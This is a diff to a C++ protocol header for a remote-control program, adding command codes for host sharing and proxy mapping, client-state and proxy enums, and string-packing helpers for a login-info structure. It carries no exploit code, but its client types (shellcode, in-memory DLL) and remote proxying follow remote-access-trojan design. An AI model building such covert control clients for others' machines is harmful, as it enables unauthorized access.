@@ -77,6 +77,14 @@ typedef void* LPVOID, * HANDLE;
 
 #define TALK_DLG_MAXLEN 1024		// 最大输入字符长度
 
+// 客户端状态: 1-被控端退出 2-主控端退出
+enum State {
+	S_CLIENT_NORMAL = 0,
+	S_CLIENT_EXIT = 1,
+	S_SERVER_EXIT = 2,
+	S_CLIENT_UPDATE = 3,
+};
+
 // 命令枚举列表
 enum
 {
@@ -150,6 +158,8 @@ enum
 	COMMAND_REGEDIT,
 	COMMAND_TALK,					// 即时消息验证
 	COMMAND_UPDATE = 53,			// 客户端升级
+	COMMAND_SHARE = 59,				// 分享主机
+	COMMAND_PROXY = 60,				// 代理映射
 
 	// 服务端发出的标识
 	TOKEN_AUTH = 100,				// 要求验证
@@ -206,6 +216,17 @@ enum
 	CMD_HEARTBEAT_ACK = 216,		// 心跳回应
 };
 
+enum ProxyManager {
+	TOKEN_PROXY_CONNECT_RESULT,
+	TOKEN_PROXY_BIND_RESULT,
+	TOKEN_PROXY_CLOSE,
+	TOKEN_PROXY_DATA,
+	COMMAND_PROXY_CLOSE,
+	COMMAND_PROXY_CONNECT,
+	COMMAND_PROXY_DATA,
+	COMMAND_PROXY_CONNECT_HOSTNAME,
+};
+
 enum 
 {
 	CLIENT_TYPE_DLL = 0,			// 客户端代码以DLL运行
@@ -215,6 +236,11 @@ enum
 	CLIENT_TYPE_SHELLCODE = 4,		// Shellcode
 	CLIENT_TYPE_MEMDLL = 5,			// 内存DLL运行
 	CLIENT_TYPE_LINUX = 6,			// LINUX 客户端
+};
+
+enum {
+	SHARE_TYPE_YAMA = 0,			// 分享给同类程序
+	SHARE_TYPE_HOLDINGHANDS = 1,	// 分享给 HoldingHands: https://github.com/yuanyuanxiang/HoldingHands
 };
 
 inline const char* GetClientType(int typ) {
@@ -272,8 +298,10 @@ public:
 		return iType;
 	}
 	void SetServer(const char* ip, int port) {
-		strcpy_s(szServerIP, ip);
-		sprintf_s(szPort, "%d", port);
+		if (ip && strlen(ip) && port > 0) {
+			strcpy_s(szServerIP, ip);
+			sprintf_s(szPort, "%d", port);
+		}
 	}
 	bool IsValid()const {
 		return strlen(szServerIP) != 0 && atoi(szPort) > 0;
@@ -282,6 +310,23 @@ public:
 		return sizeof(CONNECT_ADDRESS);
 	}
 } CONNECT_ADDRESS ;
+
+// 将字符串按指定字符分隔为向量
+inline std::vector<std::string> StringToVector(const std::string& str, char ch, int reserved = 1) {
+	// 使用字符串流来分隔字符串
+	std::istringstream stream(str);
+	std::string item;
+	std::vector<std::string> result;
+
+	// 按分号分隔字符串
+	while (std::getline(stream, item, ch)) {
+		result.push_back(item);  // 将分隔出来的子字符串添加到结果向量中
+	}
+	while (result.size() < reserved)
+		result.push_back("");
+
+	return result;
+}
 
 // 服务上线后发送的计算机信息
 // 此结构体一旦发生变化（比如大小），则以前版本的客户端无法连接新版主控.
@@ -308,6 +353,31 @@ typedef struct  LOGIN_INFOR
 	LOGIN_INFOR& Speed(unsigned long speed) {
 		dwSpeed = speed;
 		return *this;
+	}
+	void AddReserved(const char* v) {
+		if (strlen(szReserved))
+			strcat_s(szReserved, "|");
+		if (strlen(szReserved) + strlen(v) < sizeof(szReserved))
+			strcat_s(szReserved, v);
+	}
+	void AddReserved(int n) {
+		if (strlen(szReserved))
+			strcat_s(szReserved, "|");
+		char buf[24] = {};
+		sprintf_s(buf, "%d", n);
+		if (strlen(szReserved) + strlen(buf) < sizeof(szReserved))
+			strcat_s(szReserved, buf);
+	}
+	void AddReserved(double f) {
+		if (strlen(szReserved))
+			strcat_s(szReserved, "|");
+		char buf[24] = {};
+		sprintf_s(buf, "%.2f", f);
+		if (strlen(szReserved) + strlen(buf) < sizeof(szReserved))
+			strcat_s(szReserved, buf);
+	}
+	std::vector<std::string> ParseReserved(int n = 1) const {
+		return StringToVector(szReserved, '|', n);
 	}
 }LOGIN_INFOR;
 
